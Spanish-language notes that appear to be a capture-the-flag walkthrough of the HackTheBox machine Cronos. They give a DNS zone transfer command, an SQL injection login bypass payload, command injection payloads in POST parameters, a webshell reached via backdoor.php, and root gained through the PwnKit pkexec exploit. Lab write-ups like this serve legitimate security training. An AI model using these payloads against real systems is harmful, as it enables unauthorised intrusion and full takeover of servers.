PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

-Añadimos el Dominio 'cronos.htb' al /etc/hosts 

-Ejecutamos un Ataque de **Tranferencia de Zona - AXFR**:
	-dig @10.10.10.13 cronos.htb AXFR
		**admin.cronos.htb** (Subdominio Descubierto!!)

-Añadimos el nuevo Dominio al /etc/hosts

-Vamos a -http://admin.cronos.htb/ y nos encontramos un Panel de Login

-Nos Saltamos el Login con una SQLI Simple:
	-Username: 'or 1=1-- -
	-Password: 'or 1=1-- -
		-http://admin.cronos.htb/welcome.php

-Dentro encontramos una Herramienta que Ejecuta Los Comandos 'traceroute' o 'ping'

-Tiene Pinta de Command Injection

## Command Injection

-Interceptamos al Petición en:
	POST /welcome.php

-Los 2 Parámetros son Vulnerables:
	1-Parámetro 'command' --> Caracteres por los 2 Lados (ya que después de ejecuta 'host')
		-command=traceroute;id;&host=8.8.8.8
			**uid=33(www-data) gid=33(www-data) groups=33(www-data)**
	2-Parámetro 'host' --> Simple Case
		command=traceroute&host=8.8.8.8;id
			**uid=33(www-data) gid=33(www-data) groups=33(www-data)**
-------------------------------------------------------------------------------------------------------------

**-CURIOSIDAD:** A través del Command Injection, podríamos subir una webshell y Ejecutar Comandos desde la URL:
	1-Subimos la webshell a través del Command Injection:
		![[Pasted image 20250608220244.png]]
	2-Ejecutamos Comandos a través de la URL:
		-http://10.10.10.13/backdoor.php?cmd=id
			**uid=33(www-data) gid=33(www-data) groups=33(www-data)**

(**Solo Funciona** si tenemos **Permisos de Escritura** en la Ruta)
## Escalada de Privilegios

-Tenemos permisos SUID sobre el Binario /usr/bin/pkexec , Ejecutamos el Pwnkit y somos root
	**root@Cronos:/# whoami**
		**root**